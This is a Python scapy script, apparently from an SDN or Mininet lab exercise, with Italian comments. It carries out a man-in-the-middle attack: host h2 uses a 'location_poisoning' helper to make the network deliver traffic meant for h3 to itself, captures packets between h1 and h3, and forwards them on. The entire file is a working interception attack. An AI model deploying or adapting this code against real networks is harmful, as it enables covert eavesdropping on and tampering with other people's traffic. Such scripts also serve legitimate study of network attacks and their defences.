#!/usr/bin/python3
import scapy.all as scapy
import location_poisoning as lp


"""-------------------- sezione variabili di utilità --------------------"""

# Indirizzi IP degli host che ci interessano ai fini dell'attacco
H1_IP = "10.0.0.1"
H3_IP = "10.0.0.3"
H1_MAC = "00:00:00:00:00:01"
H2_MAC = "00:00:00:00:00:02"
H3_MAC = "00:00:00:00:00:03"

# Interfaccia di rete su H2
INTERFACE = "h2-eth0"

packets_buffer = []

"""-------------------- fine sezione variabili di utilità --------------------"""


def packet_callback(packet):
    if packet not in packets_buffer:
        packets_buffer.append(packet)
        if ((packet[scapy.Ether].dst == H3_MAC and packet[scapy.Ether].src == H1_MAC) or
                (packet[scapy.Ether].dst == H1_MAC and packet[scapy.Ether].src == H3_MAC)):  # MAC di h3

            print(f"Pacchetto: {packet[scapy.IP].src} --> {packet[scapy.IP].dst} intercettato da 10.0.0.2\n")
            lp.ripristina_location(packet[scapy.Ether].dst)  # Ripristina la porta originale del destinatario
            lp.scambia_location(packet[scapy.Ether].src)
            scapy.sendp(packet, iface=INTERFACE, verbose=False)  # Invia i pacchetti tramite l'interfaccia di h2
            print(f"Pacchetto inoltrato ad {packet[scapy.IP].dst}\n\n{'-' * 75}\n")


def start_sniffing():
    scapy.sniff(iface=INTERFACE, prn=packet_callback, filter="ip")


if __name__ == "__main__":
    lp.scambia_location(H3_MAC)  # Modifica la porta di h3 a quella di h2
    start_sniffing()
    lp.ripristina_location(H1_MAC)
    lp.ripristina_location(H3_MAC)
    lp.elimina_hosts()
